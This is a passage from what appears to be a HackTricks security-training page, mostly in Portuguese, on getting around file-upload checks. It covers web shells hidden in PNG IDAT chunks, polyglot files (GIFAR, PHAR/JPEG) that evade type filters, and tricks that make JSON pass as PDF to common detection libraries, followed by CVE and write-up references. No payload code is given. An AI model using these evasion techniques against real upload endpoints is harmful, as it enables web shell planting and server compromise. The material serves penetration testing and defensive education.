A exploração detalhada dessa técnica, incluindo sua metodologia e possíveis aplicações, é fornecida no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreensão abrangente do processo e de suas implicações.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Arquivos polyglot servem como uma ferramenta única em segurança cibernética, atuando como camaleões que podem existir validamente em múltiplos formatos de arquivo simultaneamente. Um exemplo intrigante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como GIF quanto como um arquivo RAR. Esses arquivos não se limitam a esse pareamento; combinações como GIF e JS ou PPT e JS também são viáveis.

A utilidade central dos arquivos polyglot está em sua capacidade de contornar medidas de segurança que filtram arquivos com base no tipo. A prática comum em várias aplicações envolve permitir apenas certos tipos de arquivo para upload — como JPEG, GIF ou DOC — para mitigar o risco apresentado por formatos potencialmente perigosos (por exemplo, JS, PHP ou arquivos Phar). No entanto, um polyglot, ao conformar-se aos critérios estruturais de múltiplos tipos de arquivo, pode contornar essas restrições furtivamente.

Apesar de sua adaptabilidade, os polyglots enfrentam limitações. Por exemplo, embora um polyglot possa simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso do seu upload pode depender das políticas de extensão de arquivo da plataforma. Se o sistema for rigoroso quanto às extensões permitidas, a mera dualidade estrutural de um polyglot pode não ser suficiente para garantir seu envio.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Como evitar detecções de tipo de arquivo enviando um arquivo JSON válido mesmo quando não permitido, falsificando um arquivo PDF (técnicas do **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Desde que os bytes mágicos `%PDF` estejam nos primeiros 1024 bytes, é considerado válido (veja exemplo no post)
- **`pdflib` library**: Adicione um formato PDF falso dentro de um campo do JSON para que a biblioteca pense que é um PDF (veja exemplo no post)
- **`file` binary**: Ele pode ler até 1048576 bytes de um arquivo. Basta criar um JSON maior que isso para que não consiga parsear o conteúdo como JSON e então, dentro do JSON, colocar a parte inicial de um PDF real e ele irá considerá-lo um PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
